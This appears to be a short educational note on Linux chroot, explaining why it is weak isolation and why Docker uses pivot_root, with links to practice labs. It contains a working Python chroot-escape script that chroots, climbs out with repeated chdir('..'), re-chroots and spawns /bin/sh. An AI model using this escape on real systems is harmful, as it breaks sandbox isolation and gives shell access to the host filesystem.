# Chroot

`chroot` aims at providing isolation, it changes the root directory
for the current running processes. It is helpful to recover the system.
Because I have used it many times for my ArchLinux.

It may seem perfect for containers to provide file-system isolation. However,
`chroot` can be exploited. Linux `/proc` filesystem manages two paths for
the currently running process.

+ `cwd`: current working directory of the process
+ `root`: root directory of the process

And we can easily get the out-side file-system using the following scripts:

```py
import os

print("PID", os.getpid())

if not os.path.exists("chroot"):
    os.mkdir("chroot")
os.chroot("chroot")

# We could change the `cwd` to be `/root`, thus we can
# get out-side file-system.
for i in range(1000):
    os.chdir("..")

# Now, we do second chroot thus get whatever we want
os.chroot(".")
# To spawn a shell
os.system("/bin/sh")
```

And there are three labs for you to code in action, just do the first.
Because it is free.

1. [Chroot Jail I](https://attackdefense.com/challengedetails?cid=1306)
2. [Chroot Jail II](https://attackdefense.com/challengedetails?cid=1307)
3. [Chroot Jail III](https://attackdefense.com/challengedetails?cid=1308)

Thus, we need to another functionality for providing isolation for Docker,
which is called `pivot_root`.

## Reference

+ [Breaking out of CHROOT Jailed Shell Environment](https://tbhaxor.com/breaking-out-of-chroot-jail-shell-environment/)
+ [Chroot](https://en.wikipedia.org/wiki/Chroot)
